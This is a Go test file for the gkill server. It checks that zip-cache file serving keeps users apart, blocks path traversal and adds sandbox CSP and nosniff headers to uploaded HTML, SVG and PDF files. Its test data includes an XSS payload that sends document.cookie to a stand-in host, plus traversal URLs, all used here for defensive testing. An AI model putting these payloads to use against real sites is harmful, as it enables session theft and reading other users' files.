package gkill_server_api

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mt3hr/gkill/src/server/gkill/api/req_res"
	"github.com/mt3hr/gkill/src/server/gkill/dao/account"
	"github.com/mt3hr/gkill/src/server/gkill/dao/account_state"
	"github.com/mt3hr/gkill/src/server/gkill/main/common/gkill_options"
)

// addZipCacheTestUser はテスト用のアカウントとログインセッションを直接DAOに作る。
// /api/login を経由しないので、Argon2idの計算を挟まずに済む。
func addZipCacheTestUser(t *testing.T, gkillAPI *GkillServerAPI, userID string) string {
	t.Helper()
	ctx := context.Background()

	existing, err := gkillAPI.GkillDAOManager.ConfigDAOs.AccountDAO.GetAccount(ctx, userID)
	if err != nil {
		t.Fatalf("GetAccount(%s) failed: %v", userID, err)
	}
	if existing == nil {
		newAccount := &account.Account{UserID: userID, IsAdmin: false, IsEnable: true}
		if _, err := gkillAPI.GkillDAOManager.ConfigDAOs.AccountDAO.AddAccount(ctx, newAccount); err != nil {
			t.Fatalf("AddAccount(%s) failed: %v", userID, err)
		}
	}

	device, err := gkillAPI.GetDevice()
	if err != nil {
		t.Fatalf("GetDevice failed: %v", err)
	}
	loginSession := &account_state.LoginSession{
		ID:              GenerateNewID(),
		UserID:          userID,
		Device:          device,
		ApplicationName: "gkill",
		SessionID:       GenerateNewID(),
		ClientIPAddress: "127.0.0.1",
		LoginTime:       time.Now(),
		ExpirationTime:  time.Now().Add(time.Hour),
		IsLocalAppUser:  true,
	}
	if _, err := gkillAPI.GkillDAOManager.ConfigDAOs.LoginSessionDAO.AddLoginSession(ctx, loginSession); err != nil {
		t.Fatalf("AddLoginSession(%s) failed: %v", userID, err)
	}
	return loginSession.SessionID
}

// writeZipCacheFile は指定ユーザのzipキャッシュ配下にファイルを置き、
// そのファイルを指す /zip_cache/... のパスを返す。
func writeZipCacheFile(t *testing.T, userID string, repName string, hash string, name string, content string) string {
	t.Helper()
	dir := filepath.Join(os.ExpandEnv(gkill_options.CacheDir), "zip_cache", userID, repName, hash)
	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
		t.Fatalf("failed to create zip cache dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
		t.Fatalf("failed to write zip cache file: %v", err)
	}
	return "/zip_cache/" + repName + "/" + hash + "/" + name
}

func getZipCache(t *testing.T, ts *httptest.Server, path string, sessionID string) *http.Response {
	t.Helper()
	return getWithSessionCookie(t, ts.URL+path, sessionID)
}

// getWithSessionCookie は gkill_session_id クッキーを付けて GET する（空なら付けない）。
// /files/ と /zip_cache/ はリクエストボディを読まないので、認証はクッキーだけで行う。
func getWithSessionCookie(t *testing.T, url string, sessionID string) *http.Response {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		t.Fatalf("NewRequest failed: %v", err)
	}
	if sessionID != "" {
		req.AddCookie(&http.Cookie{Name: "gkill_session_id", Value: sessionID})
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("GET %s failed: %v", url, err)
	}
	return resp
}

// TestZipCacheFileServeIsolatesUsers は、あるユーザのセッションで
// 他のユーザのzipキャッシュを読めないことを確認する。
//
// 以前は caches/zip_cache 直下を起点に配信していたため、ログインできる利用者なら
// 誰でも他人の展開済みZIPを読めた。今は起点をセッションから引いたユーザの
// ディレクトリに固定しているので、URLに他人のパスを書いても届かない。
func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
	defer optCleanup()

	router := gkillAPI.GkillDAOManager.GetRouter()
	router.PathPrefix("/zip_cache/").HandlerFunc(gkillAPI.wrapNoAuth(gkillAPI.HandleZipCacheFileServe))
	ts := httptest.NewServer(router)
	defer ts.Close()

	aliceSession := addZipCacheTestUser(t, gkillAPI, "alice")
	bobSession := addZipCacheTestUser(t, gkillAPI, "bob")

	// 両者とも同じrep名を使う。rep名の照合だけでは分離できないことを踏まえた構成
	const repName = "photos"
	alicePath := writeZipCacheFile(t, "alice", repName, "aaaaaaaa", "secret.txt", "alice's secret")
	bobPath := writeZipCacheFile(t, "bob", repName, "bbbbbbbb", "secret.txt", "bob's secret")

	t.Run("自分のキャッシュは読める", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, aliceSession)
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
	})

	t.Run("他人のキャッシュは読めない", func(t *testing.T) {
		resp := getZipCache(t, ts, bobPath, aliceSession)
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Errorf("alice が bob のキャッシュを読めてしまった (status = %d)", resp.StatusCode)
		}
	})

	t.Run("bob側からも同様", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, bobSession)
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Errorf("bob が alice のキャッシュを読めてしまった (status = %d)", resp.StatusCode)
		}
	})

	t.Run("ユーザで分かれていない場所は配信しない", func(t *testing.T) {
		// 旧実装は caches/zip_cache 直下を起点にしていたので、
		// ユーザ名の階層を挟まないパスがそのまま配信できてしまっていた。
		// 起点をユーザのディレクトリに固定した今は届かないこと
		dir := filepath.Join(os.ExpandEnv(gkill_options.CacheDir), "zip_cache", repName, "cccccccc")
		if err := os.MkdirAll(dir, os.ModePerm); err != nil {
			t.Fatalf("failed to create legacy zip cache dir: %v", err)
		}
		if err := os.WriteFile(filepath.Join(dir, "leak.txt"), []byte("leaked"), 0o600); err != nil {
			t.Fatalf("failed to write legacy zip cache file: %v", err)
		}

		resp := getZipCache(t, ts, "/zip_cache/"+repName+"/cccccccc/leak.txt", aliceSession)
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Error("ユーザごとに分かれていない旧レイアウトのキャッシュが配信されてしまった")
		}
	})

	t.Run("上位ディレクトリ参照で抜けられない", func(t *testing.T) {
		// http.Dir は path.Clean("/"+name) でルート化してからjoinするので抜けられないはず
		for _, path := range []string{
			"/zip_cache/../bob/" + repName + "/bbbbbbbb/secret.txt",
			"/zip_cache/..%2Fbob%2F" + repName + "%2Fbbbbbbbb%2Fsecret.txt",
			"/zip_cache/" + repName + "/../../bob/" + repName + "/bbbbbbbb/secret.txt",
		} {
			resp := getZipCache(t, ts, path, aliceSession)
			body := make([]byte, 64)
			n, _ := resp.Body.Read(body)
			resp.Body.Close()
			if resp.StatusCode == http.StatusOK && string(body[:n]) == "bob's secret" {
				t.Errorf("%s で bob のキャッシュが読めてしまった", path)
			}
		}
	})

	t.Run("セッションが無ければ拒否", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, "")
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("status = %d, want 403", resp.StatusCode)
		}
	})

	t.Run("知らないセッションIDは拒否", func(t *testing.T) {
		resp := getZipCache(t, ts, alicePath, GenerateNewID())
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("status = %d, want 403", resp.StatusCode)
		}
	})
}

// wantUserContentHTMLPolicy は利用者の HTML に付く CSP の期待値。
// utils.go の定数を参照せずに文字列で書く —— 定数を書き換えるとテストの期待値も
// 一緒に動いてしまい、緩めた（allow-same-origin を足した）ことに気付けなくなるため。
const wantUserContentHTMLPolicy = "sandbox allow-scripts allow-downloads allow-modals"

// userContentHeaderCase は利用者ファイル配信のセキュリティヘッダを1ファイルぶん検査する表の行。
type userContentHeaderCase struct {
	fileName    string // ディスクに置く名前
	urlName     string // URL に書く名前（空なら fileName のまま）
	content     string
	wantCSP     string // "" は CSP を付けないこと
	wantTypePfx string // Content-Type の前方一致。空なら見ない
}

// userContentHeaderCases は /files/ と /zip_cache/ の両方で使う表。
//
// Windows のファイルシステムは大小を区別しないので、大文字の拡張子は別の名前で置く。
// index.html は http.FileServer がディレクトリへリダイレクトするので使わない。
func userContentHeaderCases() []userContentHeaderCase {
	// クッキーを読んで外へ送る、の形。sandbox の外で動くとそのまま漏れる
	const html = "<script>fetch('//evil.invalid/'+document.cookie)</script>"
	const pdf = "%PDF-1.4 dummy"
	return []userContentHeaderCase{
		{fileName: "page.html", content: html, wantCSP: wantUserContentHTMLPolicy},
		{fileName: "page.htm", content: html, wantCSP: wantUserContentHTMLPolicy},
		{fileName: "page.xhtml", content: html, wantCSP: wantUserContentHTMLPolicy},
		{fileName: "upper.HTML", content: html, wantCSP: wantUserContentHTMLPolicy},
		// r.URL.Path はデコード済みなので %2E の表記でも .html として判定されること
		{fileName: "encoded.html", urlName: "encoded%2Ehtml", content: html, wantCSP: wantUserContentHTMLPolicy},
		// SVG は <img> で表示する画像でもあり、文書として開いたときにスクリプトを動かす理由が無い
		{fileName: "image.svg", content: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`, wantCSP: "sandbox"},
		{fileName: "note.txt", content: "plain text", wantCSP: "sandbox"},
		{fileName: "doc.pdf", content: pdf, wantCSP: "", wantTypePfx: "application/pdf"},
		{fileName: "upper.PDF", content: pdf, wantCSP: "", wantTypePfx: "application/pdf"},
	}
}

func (c userContentHeaderCase) requestName() string {
	if c.urlName != "" {
		return c.urlName
	}
	return c.fileName
}

// assertUserContentSecurityHeaders は1件の応答のヘッダを表の行と突き合わせる。
func assertUserContentSecurityHeaders(t *testing.T, resp *http.Response, c userContentHeaderCase) {
	t.Helper()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.StatusCode)
	}
	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
	}
	gotCSP := resp.Header.Values("Content-Security-Policy")
	switch {
	case c.wantCSP == "" && len(gotCSP) != 0:
		t.Errorf("Content-Security-Policy = %q, want none", gotCSP)
	case c.wantCSP != "" && (len(gotCSP) != 1 || gotCSP[0] != c.wantCSP):
		t.Errorf("Content-Security-Policy = %q, want exactly [%q]", gotCSP, c.wantCSP)
	}
	// allow-same-origin が付くと文書が gkill のオリジンに戻り、スクリプトが document.cookie で
	// セッションIDを読める。ほかの許可が増えても、これだけは絶対に付かないこと
	for _, value := range gotCSP {
		if strings.Contains(value, "allow-same-origin") {
			t.Errorf("Content-Security-Policy = %q, must not contain allow-same-origin", value)
		}
	}
	if c.wantTypePfx != "" {
		if got := resp.Header.Get("Content-Type"); !strings.HasPrefix(got, c.wantTypePfx) {
			t.Errorf("Content-Type = %q, want prefix %q", got, c.wantTypePfx)
		}
	}
}

// TestZipCacheFileServeSetsSecurityHeaders は、利用者のファイルをそのまま返す経路に
// セキュリティヘッダが付くことを確認する。
//
// この経路は取り込んだZIPの展開物を、拡張子から決めたContent-Typeで
// 同一オリジンから配信する。展開時に拡張子の許可リストは無いので、
// 受け取った .cbz にHTMLが入っていればHTMLとして解釈される。
// セッションクッキーはクライアント側のJSが document.cookie で書いており
// HttpOnly を付けられないため、同一オリジンでスクリプトが動くと読み出せてしまう。
//
// HTML（.html / .htm / .xhtml）は allow-scripts を付けた sandbox にする。allow-same-origin を
// 付けないので文書は opaque origin になり、スクリプトは動くが gkill のクッキーにも
// localStorage にも触れない（ADR-0711）。それ以外（SVG を含む）は allow-scripts の無い sandbox。
//
// 例外として .pdf は sandbox を付けない（付けると opaque origin になり
// Chrome の内蔵PDFビューワが無効化されて表示できないため）。
// nosniff は .pdf にも付き、Content-Type は application/pdf に固定されるので、
// HTMLを .pdf にリネームして持ち込んでもHTMLとしては解釈されない。
//
// ルート登録は serve.go と同じ形にしないとラッパーを通らないので注意。
// /files/ 側の同じ検査は handle_file_serve_test.go の TestFileServeSetsSecurityHeaders。
func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
	defer optCleanup()

	router := gkillAPI.GkillDAOManager.GetRouter()
	router.PathPrefix("/zip_cache/").HandlerFunc(
		withUserContentSecurityHeaders(gkillAPI.wrapNoAuth(gkillAPI.HandleZipCacheFileServe)))
	ts := httptest.NewServer(router)
	defer ts.Close()

	sessionID := addZipCacheTestUser(t, gkillAPI, "carol")
	// ZIPの中身としてHTMLやSVGやPDFが混じっている状況を作る
	cases := userContentHeaderCases()
	for _, c := range cases {
		writeZipCacheFile(t, "carol", "comics", "cccccccc", c.fileName, c.content)
	}

	for _, c := range cases {
		t.Run(c.requestName(), func(t *testing.T) {
			resp := getZipCache(t, ts, "/zip_cache/comics/cccccccc/"+c.requestName(), sessionID)
			defer resp.Body.Close()
			assertUserContentSecurityHeaders(t, resp, c)
		})
	}
}

// TestBuildZipEntriesMediaFlags は、ZIP展開物の一覧に付く種別フラグが
// 拡張子どおりに立つことを確認する。フラグはクライアントの
// 「クリックしたときの開き方」（プレビュー・再生・新タブ・ダウンロード）の分岐に使われる。
func TestBuildZipEntriesMediaFlags(t *testing.T) {
	cacheDir := t.TempDir()
	files := []string{
		"movie.mp4", "song.mp3", "doc.pdf", "photo.png",
		"note.txt", "script.ts", "archive.bin",
	}
	for _, name := range files {
		if err := os.WriteFile(filepath.Join(cacheDir, name), []byte("x"), 0o600); err != nil {
			t.Fatalf("failed to write %s: %v", name, err)
		}
	}
	if err := os.MkdirAll(filepath.Join(cacheDir, "sub"), os.ModePerm); err != nil {
		t.Fatalf("failed to create subdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(cacheDir, "sub", "inner.mp4"), []byte("x"), 0o600); err != nil {
		t.Fatalf("failed to write sub/inner.mp4: %v", err)
	}

	entries, err := buildZipEntries(cacheDir, "comics", "cccccccc")
	if err != nil {
		t.Fatalf("buildZipEntries failed: %v", err)
	}
	byPath := map[string]*req_res.ZipEntry{}
	for _, entry := range entries {
		byPath[entry.Path] = entry
	}

	type flags struct {
		isDir, isImage, isText, isVideo, isAudio, isPdf bool
	}
	wants := map[string]flags{
		"movie.mp4": {isVideo: true},
		"song.mp3":  {isAudio: true},
		"doc.pdf":   {isPdf: true},
		"photo.png": {isImage: true},
		"note.txt":  {isText: true},
		// .ts はTypeScriptとMPEG-TSの両方に該当する既知の重複。
		// クライアントはテンプレートの分岐順（is_text優先）でテキストビューワーに寄せている
		"script.ts":     {isText: true, isVideo: true},
		"archive.bin":   {},
		"sub":           {isDir: true},
		"sub/inner.mp4": {isVideo: true},
	}
	if len(byPath) != len(wants) {
		t.Errorf("entries = %d, want %d", len(byPath), len(wants))
	}
	for path, want := range wants {
		entry := byPath[path]
		if entry == nil {
			t.Errorf("entry %q not found", path)
			continue
		}
		got := flags{
			isDir:   entry.IsDir,
			isImage: entry.IsImage,
			isText:  entry.IsText,
			isVideo: entry.IsVideo,
			isAudio: entry.IsAudio,
			isPdf:   entry.IsPdf,
		}
		if got != want {
			t.Errorf("%q flags = %+v, want %+v", path, got, want)
		}
	}
}
